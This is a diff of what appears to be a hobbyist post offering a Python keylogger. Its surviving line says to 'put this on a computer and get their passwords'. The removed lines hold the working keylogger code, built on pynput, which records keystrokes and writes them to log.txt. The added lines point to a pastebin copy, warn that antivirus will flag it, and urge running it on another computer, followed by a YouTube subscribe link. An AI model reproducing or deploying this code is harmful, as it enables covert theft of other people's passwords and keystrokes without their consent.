@@ -4,69 +4,19 @@ put this on a computer and get their passwords :)
 *******************************************
 
 
-import pynput
 
-from pynput.keyboard import Key, Listener
-
-count=0
-
-keys= []
-
-def on_press(key):
-  
-  global keys, count
-
-    keys.append(key)
+   https://pastebin.com/NfJxmPfM
    
-   count +=1
-    
-    print("(0)pressed".format(key))
-
-    if count >= 10:
-       
-       count=0
-       
-       write_file(keys)
-       
-       keys= []
-
-
-def write_file(keys):
-    
-    with open("log.txt","w") as f:
-        
-        for key in keys:
-            
-            k = str(key).replace("'","")
-            
-            if k.find("space") > 0:
-             
-             f.write('/')
-            
-            elif k.find("Key") == -1:
-                
-                f.write(k)
-
-
-
-
-
-
-def on_release(key):
-    
-    if key == Key.esc:
-        
-        return False
-
-
-with Listener(on_press=on_press, on_release=on_release) as listener:
+   WARNING
    
-   listener.join()
-    
+   THIS WILL SAY YOU WILL HAVE A VIRUS WHEN YOU ARE DONE CODING! I HAVE 0 CONTROL OVER IT SO IT IS JUST YOU AND YOUR VIRUS YOU MADE!
+ 
+ In Pastebin it is the code, go ahead and edit it in any way, or just copy and try it on your other computer, or go into incognito mode.
+
     
     ********************************
     
-    Subscriber here!
+    Subscribe here!
     
     https://www.youtube.com/channel/UCgsJ63FUmiLSuryd0KedGTA
     
